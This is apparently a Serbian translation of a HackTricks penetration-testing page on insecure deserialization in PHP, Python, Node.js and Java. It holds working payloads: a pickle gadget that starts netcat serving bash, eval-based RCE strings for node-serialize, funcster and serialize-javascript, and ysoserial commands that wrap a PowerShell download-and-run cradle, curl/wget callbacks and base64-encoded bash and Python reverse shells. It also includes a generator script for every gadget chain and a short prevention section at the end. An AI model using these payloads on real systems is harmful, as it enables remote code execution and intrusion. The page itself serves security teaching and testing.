# Deserijalizacija

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJATELJSTVO**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Osnovne informacije

**Serijalizacija** se shvata kao metoda pretvaranja objekta u format koji može biti sačuvan, sa namerom da se objekat ili sačuva ili prenese kao deo komunikacionog procesa. Ova tehnika se često koristi kako bi se osiguralo da objekat može biti rekreiran u kasnijem trenutku, održavajući njegovu strukturu i stanje.

**Deserijalizacija**, suprotno tome, je proces koji neutrališe serijalizaciju. Uključuje uzimanje podataka koji su strukturirani u određenom formatu i rekonstruisanje ih nazad u objekat.

Deserijalizacija može biti opasna jer potencijalno **omogućava napadačima da manipulišu serijalizovanim podacima kako bi izvršili štetan kod** ili izazvali neočekivano ponašanje u aplikaciji tokom procesa rekonstrukcije objekta.

## PHP

U PHP-u, specifične magične metode se koriste tokom procesa serijalizacije i deserijalizacije:

* `__sleep`: Poziva se kada se objekat serijalizuje. Ova metoda treba da vrati niz imena svih svojstava objekta koja treba da budu serijalizovana. Često se koristi za potvrđivanje čekajućih podataka ili obavljanje sličnih zaduženja za čišćenje.
* `__wakeup`: Poziva se kada se objekat deserijalizuje. Koristi se za ponovno uspostavljanje bilo kakvih veza sa bazom podataka koje su možda izgubljene tokom serijalizacije i obavljanje drugih zadataka ponovnog pokretanja.
* `__unserialize`: Ova metoda se poziva umesto `__wakeup` (ako postoji) kada se objekat deserijalizuje. Pruža više kontrole nad procesom deserijalizacije u poređenju sa `__wakeup`.
* `__destruct`: Ova metoda se poziva kada se objekat uništava ili kada se skripta završava. Obično se koristi za zadatke čišćenja, poput zatvaranja fajl rukovaoca ili veza sa bazom podataka.
* `__toString`: Ova metoda omogućava da se objekat tretira kao string. Može se koristiti za čitanje fajla ili druge zadatke na osnovu poziva funkcija unutar nje, efikasno pružajući tekstualnu reprezentaciju objekta.
```php
<?php
class test {
public $s = "This is a test";
public function displaystring(){
echo $this->s.'<br />';
}
public function __toString()
{
echo '__toString method called';
}
public function __construct(){
echo "__construct method called";
}
public function __destruct(){
echo "__destruct method called";
}
public function __wakeup(){
echo "__wakeup method called";
}
public function __sleep(){
echo "__sleep method called";
return array("s"); #The "s" makes references to the public attribute
}
}

$o = new test();
$o->displaystring();
$ser=serialize($o);
echo $ser;
$unser=unserialize($ser);
$unser->displaystring();

/*
php > $o = new test();
__construct method called
__destruct method called
php > $o->displaystring();
This is a test<br />

php > $ser=serialize($o);
__sleep method called

php > echo $ser;
O:4:"test":1:{s:1:"s";s:14:"This is a test";}

php > $unser=unserialize($ser);
__wakeup method called
__destruct method called

php > $unser->displaystring();
This is a test<br />
*/
?>
```
Ako pogledate rezultate, možete videti da se funkcije **`__wakeup`** i **`__destruct`** pozivaju prilikom deserializacije objekta. Imajte na umu da u nekoliko tutorijala ćete pronaći da se funkcija **`__toString`** poziva prilikom pokušaja štampanja nekog atributa, ali izgleda da se to **više ne dešava**.

{% hint style="warning" %}
Metoda **`__unserialize(array $data)`** se poziva **umesto `__wakeup()`** ako je implementirana u klasi. Omogućava vam da deserializujete objekat pružajući serijske podatke kao niz. Možete koristiti ovu metodu da deserializujete osobine i obavite sve potrebne zadatke prilikom deserializacije.
```php
class MyClass {
private $property;

public function __unserialize(array $data): void {
$this->property = $data['property'];
// Perform any necessary tasks upon deserialization.
}
}
```
{% endhint %}

Možete pročitati objašnjen **PHP primer ovde**: [https://www.notsosecure.com/remote-code-execution-via-php-unserialize/](https://www.notsosecure.com/remote-code-execution-via-php-unserialize/), ovde [https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf](https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf) ili ovde [https://securitycafe.ro/2015/01/05/understanding-php-object-injection/](https://securitycafe.ro/2015/01/05/understanding-php-object-injection/)

### PHP Deserial + Autoload Classes

Možete zloupotrebiti PHP autoload funkcionalnost da učitate proizvoljne php fajlove i više:

{% content-ref url="php-deserialization-+-autoload-classes.md" %}
[php-deserialization-+-autoload-classes.md](php-deserialization-+-autoload-classes.md)
{% endcontent-ref %}

### Serijalizacija Referenciranih Vrednosti

Ako iz nekog razloga želite da serijalizujete vrednost kao **referencu na drugu serijalizovanu vrednost** možete:
```php
<?php
class AClass {
public $param1;
public $param2;
}

$o = new WeirdGreeting;
$o->param1 =& $o->param22;
$o->param = "PARAM";
$ser=serialize($o);
```
### PHPGGC (ysoserial za PHP)

[**PHPGGC**](https://github.com/ambionics/phpggc) može vam pomoći da generišete payload-ove za zloupotrebu PHP deserijalizacije.\
Imajte na umu da u nekoliko slučajeva **nećete moći pronaći način za zloupotrebu deserijalizacije u izvornom kodu** aplikacije, ali biste možda mogli **zloupotrebiti kod spoljnih PHP ekstenzija.**\
Dakle, ako možete, proverite `phpinfo()` servera i **tražite na internetu** (čak i na **gadgetima** **PHPGGC**) neki mogući gadget koji biste mogli zloupotrebiti.

### deserijalizacija metapodataka phar://

Ako ste pronašli LFI koji samo čita datoteku i ne izvršava PHP kod unutar nje, na primer koristeći funkcije poput _**file\_get\_contents(), fopen(), file() ili file\_exists(), md5\_file(), filemtime() ili filesize()**_. Možete pokušati zloupotrebiti **deserijalizaciju** koja se dešava prilikom **čitanja** datoteke koristeći protokol **phar**.\
Za više informacija pročitajte sledeći post:

{% content-ref url="../file-inclusion/phar-deserialization.md" %}
[phar-deserialization.md](../file-inclusion/phar-deserialization.md)
{% endcontent-ref %}

## Python

### **Pickle**

Kada se objekat depickla, funkcija _\_\_reduce\_\__ će biti izvršena.\
Kada se iskoristi, server bi mogao vratiti grešku.
```python
import pickle, os, base64
class P(object):
def __reduce__(self):
return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))
print(base64.b64encode(pickle.dumps(P())))
```
Za više informacija o bekstvu iz **pickle zatvora** pogledajte:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### Yaml **&** jsonpickle

Na sledećoj stranici je prikazana tehnika zloupotrebe nesigurne deserijalizacije u yaml Python bibliotekama, završava se alatom koji se može koristiti za generisanje RCE deserijalizacijskog payload-a za **Pickle, PyYAML, jsonpickle i ruamel.yaml**:

{% content-ref url="python-yaml-deserialization.md" %}
[python-yaml-deserialization.md](python-yaml-deserialization.md)
{% endcontent-ref %}

### Zagađenje klasa (Python Prototip Zagađenje)

{% content-ref url="../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md" %}
[class-pollution-pythons-prototype-pollution.md](../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md)
{% endcontent-ref %}

## NodeJS

### JS Magične Funkcije

JS **nema "magične" funkcije** poput PHP-a ili Python-a koje će se izvršiti samo prilikom kreiranja objekta. Ali ima neke **funkcije** koje se **često koriste čak i bez direktnog pozivanja** kao što su **`toString`**, **`valueOf`**, **`toJSON`**.\
Ako zloupotrebite deserijalizaciju, možete **ugroziti ove funkcije da izvrše drugi kod** (potencijalno zloupotrebljavajući zagađenje prototipa) i možete izvršiti proizvoljan kod kada se pozovu.

Još jedan **"magičan" način pozivanja funkcije** bez direktnog pozivanja je **ugrožavanje objekta koji vraća asinhrona funkcija** (promise). Jer, ako **transformišete** taj **vraćeni objekat** u drugi **promise** sa **svojstvom** nazvanim **"then" tipa funkcija**, biće **izvršen** samo zato što je vraćen od drugog promise-a. _Pratite_ [_**ovaj link**_](https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/) _za više informacija._
```javascript
// If you can compromise p (returned object) to be a promise
// it will be executed just because it's the return object of an async function:
async function test_resolve() {
const p = new Promise(resolve => {
console.log('hello')
resolve()
})
return p
}

async function test_then() {
const p = new Promise(then => {
console.log('hello')
return 1
})
return p
}

test_ressolve()
test_then()
//For more info: https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/
```
### `__proto__` и `prototype` загађење

Ако želite da saznate više o ovoj tehnici **pogledajte sledeći tutorijal**:

{% content-ref url="nodejs-proto-prototype-pollution/" %}
[nodejs-proto-prototype-pollution](nodejs-proto-prototype-pollution/)
{% endcontent-ref %}

### [node-serialize](https://www.npmjs.com/package/node-serialize)

Ova biblioteka omogućava serializaciju funkcija. Primer:
```javascript
var y = {
"rce": function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })},
}
var serialize = require('node-serialize');
var payload_serialized = serialize.serialize(y);
console.log("Serialized: \n" + payload_serialized);
```
**Serializovani objekat** će izgledati ovako:
```bash
{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}"}
```
Možete videti u primeru da kada je funkcija serializovana, zastava `_$$ND_FUNC$$_` se dodaje serializovanom objektu.

Unutar fajla `node-serialize/lib/serialize.js` možete pronaći istu zastavu i kako je kod koristi.

![](<../../.gitbook/assets/image (348).png>)

![](<../../.gitbook/assets/image (443).png>)

Kao što možete videti u poslednjem delu koda, **ako se pronađe zastava**, `eval` se koristi za deserializaciju funkcije, tako da se **korisnički unos koristi unutar funkcije `eval`**.

Međutim, **samo serializovanje** funkcije **neće je izvršiti** jer bi bilo potrebno da neki deo koda **poziva `y.rce`** u našem primeru, što je veoma **neverovatno**.\
U svakom slučaju, možete **izmeniti serializovani objekat** **dodavanjem zagrada** kako biste automatski izvršili serializovanu funkciju prilikom deserializacije objekta.\
U sledećem delu koda **obratite pažnju na poslednje zagrade** i kako će funkcija `unserialize` automatski izvršiti kod:
```javascript
var serialize = require('node-serialize');
var test = {"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"};
serialize.unserialize(test);
```
Kao što je prethodno naznačeno, ova biblioteka će dobiti kod nakon `_$$ND_FUNC$$_` i **izvršiti ga** koristeći `eval`. Stoga, kako bi se **automatski izvršio kod**, možete **izbrisati deo kreiranja funkcije** i poslednju zagradu i **samo izvršiti JS jednolinijski kod** kao u sledećem primeru:
```javascript
var serialize = require('node-serialize');
var test = '{"rce":"_$$ND_FUNC$$_require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) })"}';
serialize.unserialize(test);
```
Možete [**ovde pronaći**](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/) **dodatne informacije** o tome kako iskoristiti ovu ranjivost.

### [funcster](https://www.npmjs.com/package/funcster)

Značajna karakteristika **funcster**-a je nedostupnost **standardnih ugrađenih objekata**; oni se nalaze van dostupnog opsega. Ovo ograničenje sprečava izvršavanje koda koji pokušava da pozove metode na ugrađenim objektima, što dovodi do izuzetaka poput `"ReferenceError: console is not defined"` kada se koriste komande poput `console.log()` ili `require(something)`.

Ipak, uprkos ovom ograničenju, moguće je povratiti pun pristup globalnom kontekstu, uključujući sve standardne ugrađene objekte, kroz određeni pristup. Korišćenjem globalnog konteksta direktno, moguće je zaobići ovo ograničenje. Na primer, pristup može biti ponovo uspostavljen korišćenjem sledećeg isečka koda:
```javascript
funcster = require("funcster");
//Serialization
var test = funcster.serialize(function() { return "Hello world!" })
console.log(test) // { __js_function: 'function(){return"Hello world!"}' }

//Deserialization with auto-execution
var desertest1 = { __js_function: 'function(){return "Hello world!"}()' }
funcster.deepDeserialize(desertest1)
var desertest2 = { __js_function: 'this.constructor.constructor("console.log(1111)")()' }
funcster.deepDeserialize(desertest2)
var desertest3 = { __js_function: 'this.constructor.constructor("require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });")()' }
funcster.deepDeserialize(desertest3)
```
**Za** [**više informacija pročitajte ovaj izvor**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### [**serialize-javascript**](https://www.npmjs.com/package/serialize-javascript)

Paket **serialize-javascript** je dizajniran isključivo za svrhe serializacije, bez ugrađenih mogućnosti za deserializaciju. Korisnici su odgovorni za implementaciju sopstvene metode za deserializaciju. Direktna upotreba `eval`-a je predložena u zvaničnom primeru za deserializaciju serializovanih podataka:
```javascript
function deserialize(serializedJavascript){
return eval('(' + serializedJavascript + ')');
}
```
Ako se ova funkcija koristi za deserijalizaciju objekata, možete je **lako iskoristiti**:
```javascript
var serialize = require('serialize-javascript');
//Serialization
var test = serialize(function() { return "Hello world!" });
console.log(test) //function() { return "Hello world!" }

//Deserialization
var test = "function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"
deserialize(test)
```
**Za** [**više informacija pročitajte ovaj izvor**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### Cryo biblioteka

Na sledećim stranicama možete pronaći informacije o tome kako zloupotrebiti ovu biblioteku da biste izvršili proizvoljne komande:

* [https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)
* [https://hackerone.com/reports/350418](https://hackerone.com/reports/350418)

## Java - HTTP

U Javi, **callback-ovi za deserializaciju se izvršavaju tokom procesa deserializacije**. Ovu izvršnu moć mogu iskoristiti napadači koji kreiraju zlonamerne "payload"-e koji pokreću ove callback-ove, što može dovesti do potencijalnog izvršenja štetnih akcija.

### Otisci prstiju

#### White Box

Da biste identifikovali potencijalne ranjivosti serijalizacije u kodnoj bazi, potražite:

* Klase koje implementiraju interfejs `Serializable`.
* Korišćenje funkcija `java.io.ObjectInputStream`, `readObject`, `readUnshare`.

Posebno obratite pažnju na:

* `XMLDecoder` korišćen sa parametrima definisanim od strane spoljnih korisnika.
* `XStream`-ovu metodu `fromXML`, posebno ako je verzija XStream-a manja ili jednaka 1.46, jer je podložna problemima sa serijalizacijom.
* `ObjectInputStream` uparen sa metodom `readObject`.
* Implementacija metoda poput `readObject`, `readObjectNodData`, `readResolve` ili `readExternal`.
* `ObjectInputStream.readUnshared`.
* Opšta upotreba `Serializable`.

#### Black Box

Za testiranje crne kutije, potražite specifične **potpise ili "Magic Bytes"** koji označavaju java serijalizovane objekte (potičući od `ObjectInputStream`):

* Heksadecimalni obrazac: `AC ED 00 05`.
* Base64 obrazac: `rO0`.
* HTTP odgovori sa zaglavljima `Content-type` postavljenim na `application/x-java-serialized-object`.
* Heksadecimalni obrazac koji ukazuje na prethodnu kompresiju: `1F 8B 08 00`.
* Base64 obrazac koji ukazuje na prethodnu kompresiju: `H4sIA`.
* Veb fajlovi sa ekstenzijom `.faces` i parametrom `faces.ViewState`. Otkrivanje ovih obrazaca u veb aplikaciji trebalo bi da podstakne ispitivanje kako je detaljno opisano u [postu o Java JSF ViewState Deserializaciji](java-jsf-viewstate-.faces-deserialization.md).
```
javax.faces.ViewState=rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwdAAML2xvZ2luLnhodG1s
```
### Provera ranjivosti

Ako želite da **sažnate kako funkcioniše Java Deserialized eksploatacija**, trebalo bi da pogledate [**Osnovnu Java Deserializaciju**](basic-java-deserialization-objectinputstream-readobject.md), [**Java DNS Deserializaciju**](java-dns-deserialization-and-gadgetprobe.md) i [**CommonsCollection1 Payload**](java-transformers-to-rutime-exec-payload.md).

#### Testiranje belom kutijom

Možete proveriti da li je instalirana neka aplikacija sa poznatim ranjivostima.
```bash
find . -iname "*commons*collection*"
grep -R InvokeTransformer .
```
Možete pokušati **proveriti sve biblioteke** za koje se zna da su ranjive i za koje [**Ysoserial**](https://github.com/frohoff/ysoserial) može pružiti eksploataciju. Ili možete proveriti biblioteke navedene na [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#genson-json).\
Takođe možete koristiti [**gadgetinspector**](https://github.com/JackOfMostTrades/gadgetinspector) da pretražite moguće lance gedžeta koji se mogu iskoristiti.\
Prilikom pokretanja **gadgetinspectora** (nakon izgradnje), ne brinite o gomili upozorenja/grešaka kroz koje prolazi i pustite ga da završi. Sve rezultate će zapisati pod _gadgetinspector/gadget-results/gadget-chains-year-month-day-hore-min.txt_. Imajte na umu da **gadgetinspector neće kreirati eksploataciju i može pokazati lažne pozitivne rezultate**.

#### Test Crne Kutije

Korišćenjem Burp ekstenzije [**gadgetprobe**](java-dns-deserialization-and-gadgetprobe.md) možete identifikovati **koje biblioteke su dostupne** (čak i verzije). Sa ovim informacijama bi moglo biti **jednostavnije izabrati payload** za iskorišćavanje ranjivosti.\
[**Pročitajte ovo da biste saznali više o GadgetProbe**](java-dns-deserialization-and-gadgetprobe.md#gadgetprobe)**.**\
GadgetProbe je fokusiran na **`ObjectInputStream` deserializacije**.

Korišćenjem Burp ekstenzije [**Java Deserialization Scanner**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner) možete **identifikovati ranjive biblioteke** koje se mogu iskoristiti sa ysoserial i ih **iskoristiti**.\
[**Pročitajte ovo da biste saznali više o Java Deserialization Scanneru.**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner)\
Java Deserialization Scanner je fokusiran na **`ObjectInputStream`** deserializacije.

Takođe možete koristiti [**Freddy**](https://github.com/nccgroup/freddy) da otkrijete ranjivosti deserializacije u **Burp**-u. Ovaj dodatak će otkriti ranjivosti koje nisu samo povezane sa **`ObjectInputStream`** već i ranjivosti iz biblioteka za deserializaciju **Json** i **Yml**. U aktivnom režimu, pokušaće da ih potvrdi korišćenjem sleep ili DNS payloada.\
[**Više informacija o Freddy-u možete pronaći ovde.**](https://www.nccgroup.com/us/about-us/newsroom-and-events/blog/2018/june/finding-deserialisation-issues-has-never-been-easier-freddy-the-serialisation-killer/)

**Testiranje Serijalizacije**

Nije sve u proveri da li server koristi ranjive biblioteke. Ponekad možete **promeniti podatke unutar serijalizovanog objekta i zaobići neke provere** (možda vam omogućiti administratorske privilegije unutar veb aplikacije).\
Ako pronađete java serijalizovan objekat koji se šalje veb aplikaciji, možete koristiti [**SerializationDumper**](https://github.com/NickstaDB/SerializationDumper) **da štampate serijalizovani objekat koji se šalje u formatu koji je čitljiviji čoveku**. Poznavanje podataka koje šaljete olakšaće vam da ih izmenite i zaobiđete neke provere.

### **Eksploatacija**

#### **ysoserial**

Glavni alat za eksploataciju Java deserializacija je [**ysoserial**](https://github.com/frohoff/ysoserial) ([**preuzmite ovde**](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)). Takođe možete razmotriti korišćenje [**ysoseral-modified**](https://github.com/pimps/ysoserial-modified) koji će vam omogućiti korišćenje kompleksnih komandi (sa cevima na primer).\
Imajte na umu da je ovaj alat **usmeren** na iskorišćavanje **`ObjectInputStream`**.\
Preporučujem da **počnete sa "URLDNS"** payloadom **pre RCE** payloada da biste testirali da li je ubrizgavanje moguće. U svakom slučaju, imajte na umu da možda "URLDNS" payload ne radi, ali drugi RCE payload može.
```bash
# PoC to make the application perform a DNS req
java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://b7j40108s43ysmdpplgd3b7rdij87x.burpcollaborator.net > payload

# PoC RCE in Windows
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 'cmd /c ping -n 5 127.0.0.1' > payload
# Time, I noticed the response too longer when this was used
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c timeout 5" > payload
# Create File
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c echo pwned> C:\\\\Users\\\\username\\\\pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c nslookup jvikwa34jwgftvoxdz16jhpufllb90.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c certutil -urlcache -split -f http://j4ops7g6mi9w30verckjrk26txzqnf.burpcollaborator.net/a a"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAYwBlADcAMABwAG8AbwB1ADAAaABlAGIAaQAzAHcAegB1AHMAMQB6ADIAYQBvADEAZgA3ADkAdgB5AC4AYgB1AHIAcABjAG8AbABsAGEAYgBvAHIAYQB0AG8AcgAuAG4AZQB0AC8AYQAnACkA"
## In the ast http request was encoded: IEX(New-Object Net.WebClient).downloadString('http://1ce70poou0hebi3wzus1z2ao1f79vy.burpcollaborator.net/a')
## To encode something in Base64 for Windows PS from linux you can use: echo -n "<PAYLOAD>" | iconv --to-code UTF-16LE | base64 -w0
# Reverse Shell
## Encoded: IEX(New-Object Net.WebClient).downloadString('http://192.168.1.4:8989/powercat.ps1')
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANAA6ADgAOQA4ADkALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkA"

#PoC RCE in Linux
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "ping -c 5 192.168.1.4" > payload
# Time
## Using time in bash I didn't notice any difference in the timing of the response
# Create file
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "touch /tmp/pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "dig ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "nslookup ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "curl ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net" > payload
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "wget ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# Reverse shell
## Encoded: bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" | base64 -w0
## Encoded: export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,ZXhwb3J0IFJIT1NUPSIxMjcuMC4wLjEiO2V4cG9ydCBSUE9SVD0xMjM0NTtweXRob24gLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oIi9iaW4vc2giKSc=}|{base64,-d}|{bash,-i}"

# Base64 encode payload in base64
base64 -w0 payload
```
Prilikom kreiranja payload-a za **java.lang.Runtime.exec()** ne možete koristiti specijalne karaktere poput ">" ili "|" za preusmeravanje izlaza izvršenja, "$()" za izvršavanje komandi ili čak **prosleđivanje argumenata** komandi razdvojenih **razmacima** (možete uraditi `echo -n "hello world"` ali ne možete uraditi `python2 -c 'print "Hello world"'`). Da biste pravilno enkodovali payload, možete [koristiti ovu veb stranicu](http://www.jackson-t.ca/runtime-exec-payloads.html).

Slobodno koristite sledeći skript za kreiranje **svih mogućih payload-a za izvršavanje koda** za Windows i Linux, a zatim ih testirajte na ranjivoj veb stranici:
```python
import os
import base64

# You may need to update the payloads
payloads = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7', 'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JSON1', 'JavassistWeld1', 'Jdk7u21', 'MozillaRhino1', 'MozillaRhino2', 'Myfaces1', 'Myfaces2', 'ROME', 'Spring1', 'Spring2', 'Vaadin1', 'Wicket1']
def generate(name, cmd):
for payload in payloads:
final = cmd.replace('REPLACE', payload)
print 'Generating ' + payload + ' for ' + name + '...'
command = os.popen('java -jar ysoserial.jar ' + payload + ' "' + final + '"')
result = command.read()
command.close()
encoded = base64.b64encode(result)
if encoded != "":
open(name + '_intruder.txt', 'a').write(encoded + '\n')

generate('Windows', 'ping -n 1 win.REPLACE.server.local')
generate('Linux', 'ping -c 1 nix.REPLACE.server.local')
```
#### serialkillerbypassgadgets

Možete **koristiti** [**https://github.com/pwntester/SerialKillerBypassGadgetCollection**](https://github.com/pwntester/SerialKillerBypassGadgetCollection) **zajedno sa ysoserialom kako biste kreirali više eksploatacija**. Više informacija o ovom alatu možete pronaći u **slajdovima predavanja** na kojem je alat predstavljen: [https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1](https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1)

#### marshalsec

[**marshalsec**](https://github.com/mbechler/marshalsec) može se koristiti za generisanje payloada za eksploataciju različitih **Json** i **Yml** biblioteka za serijalizaciju u Javi.\
Da biste kompajlirali projekat, morao sam **dodati** ove **zavisnosti** u `pom.xml`:
```markup
<dependency>
<groupId>javax.activation</groupId>
<artifactId>activation</artifactId>
<version>1.1.1</version>
</dependency>

<dependency>
<groupId>com.sun.jndi</groupId>
<artifactId>rmiregistry</artifactId>
<version>1.2.1</version>
<type>pom</type>
</dependency>
```
**Instalirajte Maven**, a zatim **kompajlirajte** projekat:
```bash
sudo apt-get install maven
mvn clean package -DskipTests
```
#### FastJSON

Pročitajte više o ovoj Java JSON biblioteci: [https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html](https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html)

### Laboratorije

* Ako želite da testirate neke ysoserial payload-e, možete **pokrenuti ovu web aplikaciju**: [https://github.com/hvqzao/java-deserialize-webapp](https://github.com/hvqzao/java-deserialize-webapp)
* [https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/](https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)

### Zašto

Java koristi mnogo serializacije u različite svrhe kao što su:

* **HTTP zahtevi**: Serializacija se široko koristi u upravljanju parametrima, ViewState-om, kolačićima, itd.
* **RMI (Remote Method Invocation)**: Java RMI protokol, koji se oslanja isključivo na serializaciju, osnova je za udaljenu komunikaciju u Java aplikacijama.
* **RMI preko HTTP-a**: Ovaj metod se često koristi u Java baziranim debelim klijentskim web aplikacijama, koristeći serializaciju za sve komunikacije objekata.
* **JMX (Java Management Extensions)**: JMX koristi serializaciju za prenos objekata preko mreže.
* **Prilagođeni protokoli**: U Javi, standardna praksa uključuje prenos sirovih Java objekata, što će biti prikazano u budućim primerima eksploatacije.

### Prevencija

#### Privremeni objekti

Klasa koja implementira `Serializable` može označiti bilo koji objekat unutar klase koji ne bi trebalo da bude serializovan kao `transient`. Na primer:
```java
public class myAccount implements Serializable
{
private transient double profit; // declared transient
private transient double margin; // declared transient
```
#### Izbegavajte serijalizaciju klase koja mora da implementira Serializable

U scenarijima gde određeni **objekti moraju da implementiraju `Serializable`** interfejs zbog hijerarhije klasa, postoji rizik od nenamernog deserijalizovanja. Da biste to sprečili, obezbedite da ovi objekti nisu deserijalizovani definisanjem `final` `readObject()` metode koja dosledno baca izuzetak, kao što je prikazano u primeru ispod:
```java
private final void readObject(ObjectInputStream in) throws java.io.IOException {
throw new java.io.IOException("Cannot be deserialized");
}
```
#### **Unapređenje bezbednosti deserijalizacije u Javi**

Prilagođavanje `java.io.ObjectInputStream` je praktičan pristup za obezbeđivanje procesa deserijalizacije. Ova metoda je pogodna kada:

* Kod deserijalizacije je pod vašom kontrolom.
* Klase očekivane za deserijalizaciju su poznate.

